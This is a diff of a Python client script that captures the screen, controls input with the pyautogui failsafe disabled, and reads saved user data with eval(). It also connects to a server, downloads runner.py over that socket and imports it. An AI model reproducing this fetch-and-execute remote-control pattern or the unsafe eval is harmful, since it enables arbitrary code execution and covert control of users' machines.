@@ -1,8 +1,20 @@
+import socket
+from os import system as system_caller
+from platform import system
+import pyautogui
+from PIL import Image, ImageGrab
+pyautogui.FAILSAFE = False
+
+
 try:
-    user_id = open('user_id', 'r').read()
+    user_data = eval(open('self_data', 'r').read())
+    u_name = user_data['u_name']
 except:
-    user_id = input('enter user id: ')
-    open('user_id', 'w').write(user_id)
+    user_data = {}
+    u_name = input('enter username: ').strip()
+    system_caller('cls')
+    user_data['u_name'] = u_name
+    open('self_data', 'w').write(str(user_data))
 
 
 BUFFER_SIZE = 1024*100
@@ -15,14 +27,6 @@ pip.main(['install', 'opencv_python'])
 pip.main(['install', 'psutil'])
 pip.main(['install', 'requests'])
 del pip
-
-
-import socket
-from os import system as system_caller
-from platform import system
-import pyautogui
-from PIL import Image, ImageGrab
-pyautogui.FAILSAFE = False
 
 system_caller('cls')
 os_type = system()
@@ -131,10 +135,7 @@ if open('final_main.py', 'rb').read() != main_data:
 else:
     connection = force_connect_server('tcp')
     __send_to_connection(connection, b'1')
-    open('runner.py', 'wb').close()
-    runner_file = open('runner.py', 'ab')
-    runner_file.write(__receive_from_connection(connection))
-    runner_file.close()
-    connection.close()
+    with open('runner.py', 'wb') as runner_file:
+        runner_file.write(__receive_from_connection(connection))
     import runner
-    runner.run(host_ip, host_port, user_id)
+    runner.run(user_data)
